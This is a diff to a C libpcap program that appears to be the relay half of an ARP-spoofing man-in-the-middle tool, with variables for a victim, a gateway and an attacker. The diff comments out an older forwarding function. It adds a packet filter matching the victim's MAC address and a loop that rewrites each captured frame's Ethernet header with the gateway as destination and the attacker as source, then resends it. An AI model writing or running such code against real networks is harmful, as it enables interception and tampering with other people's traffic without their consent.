@@ -13,13 +13,12 @@
 #define ETH_LEN			6
 #define IP_LEN			4
 
-#define ETHERTYPE_ARP	0x0806
 #define ETHERTYPE_IP	0x0800
 
 #define _TEST_CASE_3
 
 /* [void] [Forwarding] [] */
-void ip_forwarding(_In_ pcap_t* _dev_handle, _In_ struct ether_header* _pEth, _In_ pcap_pkthdr* _header, _In_ const uint8_t* _data);
+//void ip_forwarding(_In_ pcap_t* _dev_handle, _In_ struct ether_header* _pEth, _In_ pcap_pkthdr* _header, _In_ const uint8_t* _data);
 
 /* [T/F] [String MAC Address to 8Bit Array] [_src(String), _dst(8Bit Array)] */
 bool set_host(_In_ const char* _src, _Inout_ uint8_t* _dst);
@@ -46,7 +45,7 @@ typedef struct _pcap_info
 #pragma pack(push, 1)
 struct ether_header
 {
-	uint8_t		dst_host[ETH_LEN];		// (8Bit x 6)	Destination MAC Address
+	uint8_t		dst_host[ETH_LEN];		// (8Bit x 6)	Destination MAC Address 
 	uint8_t		src_host[ETH_LEN];		// (8Bit x 6)	Source MAC Address
 	uint16_t	ether_type;				// (16Bit)		Ethernet Type
 };
@@ -126,11 +125,17 @@ int main(void)
 	set_ip(_info.v_ip, victim_ip);
 	set_ip(_info.g_ip, gateway_ip);
 
-	pcap_pkthdr* header;
-	const uint8_t* data;
+	pcap_pkthdr header;
+	uint8_t* data;
+
+	struct ether_header Eth;
+	set_host(_info.g_host, Eth.dst_host);
+	set_host(_info.a_host,Eth.src_host); 
+	Eth.ether_type = htons(ETHERTYPE_IP);
+
 	while (true)
 	{
-		if (pcap_next_ex(dev_handle, &header, &data) <= 0) continue;
+		/*if (pcap_next_ex(dev_handle, &header, &data) <= 0) continue;
 		else if (header->len == 0) continue;
 		else
 		{
@@ -144,25 +149,31 @@ int main(void)
 				}
 				else ip_forwarding(dev_handle, pEth, header, data);
 			}
+		}*/
+
+		if ((data = (uint8_t*)pcap_next(dev_handle, &header)) != NULL)
+		{
+			memcpy(data, &Eth, sizeof(Eth));
+			pcap_sendpacket(dev_handle, data, header.len);
 		}
 	}
 	return 0;
 }
 
-void ip_forwarding(_In_ pcap_t* _dev_handle, _In_ struct ether_header* _pEth, _In_ pcap_pkthdr* _header, _In_ const uint8_t* _data)
-{
-	set_host(_info.g_host, _pEth->dst_host);
-	set_host(_info.a_host, _pEth->src_host);
-
-	uint8_t packet[10000];
-	int packet_len = 0;
-
-	memcpy(packet, _pEth, sizeof(*_pEth));
-	packet_len += sizeof(*_pEth);
-
-	memcpy(packet + packet_len, _data + packet_len, _header->len - packet_len);
-	pcap_sendpacket(_dev_handle, packet, _header->len);
-}
+//void ip_forwarding(_In_ pcap_t* _dev_handle, _In_ struct ether_header* _pEth, _In_ pcap_pkthdr* _header, _In_ const uint8_t* _data)
+//{
+//	set_host(_info.g_host, _pEth->dst_host);
+//	set_host(_info.a_host, _pEth->src_host);
+//
+//	uint8_t packet[2500];
+//	int packet_len = 0;
+//
+//	memcpy(packet, _pEth, sizeof(*_pEth));
+//	packet_len += sizeof(*_pEth);
+//
+//	memcpy(packet + packet_len, _data + packet_len, _header->len - packet_len);
+//	pcap_sendpacket(_dev_handle, packet, _header->len);
+//}
 
 bool set_host(_In_ const char* _src, _Inout_ uint8_t* _dst)
 {
@@ -228,5 +239,29 @@ pcap_t* get_pcap_handle()
 		return NULL;
 	}
 	pcap_freealldevs(allDev);
+
+	uint32_t net, mask;
+	if (pcap_lookupnet(tempDev->name, &net, &mask, errbuf) < 0)
+	{
+		printf("[ERROR] pcap_lookupnet() : %s\n", errbuf);
+		return NULL;
+	}
+
+	bpf_program fcode;
+	char filter_rule[2500];
+	snprintf(filter_rule, sizeof(filter_rule),
+		"ip and ether src %s and not ip broadcast and not ip dst %s",
+		_info.v_host, _info.a_ip);
+	if (pcap_compile(_handle, &fcode, filter_rule, 1, mask) < 0)
+	{
+		printf("[ERROR] pcap_compile() : %s\n", errbuf);
+		return NULL;
+	}
+
+	if (pcap_setfilter(_handle, &fcode) < 0) {
+		printf("[ERROR] pcap_setfilter() : %s\n", errbuf);
+		return NULL;
+	}
+
 	return _handle;
 }
